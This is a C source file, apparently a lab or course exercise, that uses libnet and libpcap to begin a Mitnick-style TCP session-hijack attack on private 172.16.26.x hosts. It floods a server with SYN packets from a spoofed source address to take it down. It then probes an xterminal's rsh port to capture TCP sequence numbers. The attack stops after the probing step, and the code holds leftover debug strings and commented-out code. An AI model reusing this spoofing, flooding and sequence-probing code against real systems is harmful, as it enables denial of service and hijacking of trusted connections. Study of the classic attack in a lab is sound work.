#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-structures.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

#define KEVIN_ADDR "172.16.26.2"
#define SERVER_ADDR "172.16.26.3"
#define XTERM_ADDR "172.16.26.4"

#define SERVER_PORT 513
#define XTERM_PORT 514

#define RANDOM_ADDR "130.92.6.97"

#define FLOOD_AMMOUNT 20
#define FLOOD_DISABLE "disable"
#define FLOOD_ENABLE "enable"

static void packet_handler(u_char *user, const struct pcap_pkthdr *h,
                           const u_char *packet) {
  struct ip *ip = (struct ip *)(packet + sizeof(struct ether_header));
  struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ether_header) +
                                         sizeof(struct ip));

  if (513 == ntohs(tcp->dest)) {
    printf("Alloha\n");
    pcap_breakloop((pcap_t *)user);
  }

  return;
}

static void isn_probe_handler(u_char *user, const struct pcap_pkthdr *h,
                              const u_char *packet) {
  struct ip *ip = (struct ip *)(packet + sizeof(struct ether_header));
  struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ether_header) +
                                         sizeof(struct ip));

  if (514 == ntohs(tcp->source)) {
    printf("Alloha, %d %d\n", tcp->ack_seq, tcp->ack);

    pcap_breakloop((pcap_t *)user);
  }

  return;
}

/*
 * Sends a SYN packet with enable payload to the server to bring it back up
 *
 */
int server_enable(libnet_t *libnet_ctx, pcap_t *handle) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, RANDOM_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, SERVER_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Enabling server @ %s.\n", SERVER_ADDR);

  /* create tcp */
  libnet_ptag_t tcp_h = libnet_build_tcp(
      1337, SERVER_PORT, 50, 50, TH_SYN, 50, 0, 0, LIBNET_TCP_H,
      (const uint8_t *)FLOOD_ENABLE, strlen(FLOOD_ENABLE), libnet_ctx, 0);

  /* build IP header */
  libnet_ptag_t ip_h =
      libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100,
                        IPPROTO_TCP, 0, src_ip, dst_ip, NULL, 0, libnet_ctx, 0);

  /* send packet */
  if (libnet_write(libnet_ctx) == -1) {
    printf("\e[31m[!]\e[0m libnet write failed.\n");
    exit(-1);
  }

  return 0;
}

/*
 * Floods the server with 20 SYN disable packets to bring it down
 *
 */
int dos(libnet_t *libnet_ctx, pcap_t *handle) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, RANDOM_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, SERVER_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Flooding %s.\n", SERVER_ADDR);

  /* start flooding */
  libnet_ptag_t tcp_h;
  int ip_built = 0;
  for (int flood_count = 0, tcp_h = LIBNET_PTAG_INITIALIZER;
       flood_count < FLOOD_AMMOUNT; ++flood_count) {

    /*
     * create tcp header
     * first time, tcp_h 0, next times it will modify same header
     */
    tcp_h = libnet_build_tcp(1337, SERVER_PORT, 50, 50, TH_SYN, 50, 0, 0,
                             LIBNET_TCP_H, (const uint8_t *)FLOOD_DISABLE,
                             strlen(FLOOD_DISABLE), libnet_ctx, tcp_h);

    /* build IP header the first time */
    if (!ip_built) {
      ip_built = 1;

      libnet_ptag_t ip_h = libnet_build_ipv4(
          LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100, IPPROTO_TCP, 0,
          src_ip, dst_ip, NULL, 0, libnet_ctx, 0);
    }

    /* send packet */
    if (libnet_write(libnet_ctx) == -1) {
      printf("\e[31m[!]\e[0m libnet write failed.\n");
      exit(-1);
    }
    // libnet_clear_packet(libnet_ctx);

    // pcap_loop(handle, 0, packet_handler, (u_char *)handle);
  }

  return 0;
}

int isn_probe(libnet_t *libnet_ctx, pcap_t *handle) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, KEVIN_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, XTERM_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Probing\n");

  for (int attempt = 0; attempt < 3; ++attempt) {
    /* create tcp */
    libnet_ptag_t tcp_h =
        libnet_build_tcp(1337, 514, 50, 0, TH_SYN, 50, 0, 0, LIBNET_TCP_H, NULL,
                         0, libnet_ctx, 0);

    /* build IP header */
    libnet_ptag_t ip_h = libnet_build_ipv4(
        LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100, IPPROTO_TCP, 0, src_ip,
        dst_ip, NULL, 0, libnet_ctx, 0);

    /* send packet */
    if (libnet_write(libnet_ctx) == -1) {
      printf("\e[31m[!]\e[0m libnet write failed.\n");
      exit(-1);
    }
    // libnet_clear_packet(libnet_ctx);

    pcap_loop(handle, 0, isn_probe_handler, (u_char *)handle);
  }

  return 0;
}

int attack(libnet_t *libnet_ctx, pcap_t *handle) {
  printf("\e[33m[*]\e[0m Initiating attack.\n");

  /* do synflood attack to dos the server */
  if (dos(libnet_ctx, handle)) {
    printf("\e[31m[!]\e[0m DOS attack failed.\n");
    exit(-1);
  }
  printf("\e[33m[*]\e[0m DOS attack finished.\n");

  /* start probing */
  isn_probe(libnet_ctx, handle);

  /* check if server is indeed down */
  printf("\e[33m[*]\e[0m Checking whether server is down\n");

  return 0;
}

libnet_t *init_libnet(void) {
  /* initialize libnet */
  char errbuff[LIBNET_ERRBUF_SIZE];
  libnet_t *libnet_ctx = libnet_init(LIBNET_RAW4, NULL, errbuff);

  if (!libnet_ctx) {
    printf("\e[31m[!]\e[0m Could not initialize libnet, exiting. (%s)\n",
           errbuff);
    exit(-1);
  }

  return libnet_ctx;
}

pcap_t *init_libpcap() {
  /* initialize libpcap */
  char errbuff[PCAP_ERRBUF_SIZE];

  pcap_if_t *interfaces, *temp;

  if (pcap_findalldevs(&interfaces, errbuff) == -1) {
    printf("\e[31m[!]\e[0m Libpcap failed. (%s)\n", errbuff);
    exit(-1);
  }

  for (temp = interfaces; temp; temp = temp->next) {
    printf("%s\n", temp->name);
  }

  /* get network info */
  bpf_u_int32 ip_raw, subnet_mask_raw;
  if (pcap_lookupnet("eth0", &ip_raw, &subnet_mask_raw, errbuff) == -1) {
    printf("\e[31m[!]\e[0m Libpcap failed. (%s)\n", errbuff);
    exit(-1);
  }

  pcap_t *handle = pcap_open_live("eth0", 1024, 0, 100, errbuff);
  if (!handle) {
    printf("\e[31m[!]\e[0m Libpcap failed. (%s)\n", errbuff);
    exit(-1);
  }

  // pcap_loop(handle, 0, packet_handler, (u_char *)handle);

  // struct pcap_pkthdr packet_header;
  // const u_char *packet = pcap_next(handle, &packet_header);
  // if (!packet) {
  //   printf("no packet\n");
  //   exit(-1);
  // }

  // printf("%d %d \n", packet_header.caplen, packet_header.len);

  return handle;
}

int main(int argc, char **argv) {
  /* initialize libnet */
  libnet_t *libnet_ctx = init_libnet();

  /* initialize libpcap */
  pcap_t *handle = init_libpcap();
  printf("\e[33m[*]\e[0m Libpcap initialized on eth0\n");

  /* launch attack */
  if (attack(libnet_ctx, handle)) {
    printf("\e[31m[!]\e[0m Attack failed.\n");
    exit(-1);
  }

  printf("\e[33m[*]\e[0m Attack finished.\n");

  /* free libnet */
  libnet_destroy(libnet_ctx);

  return 0;
}
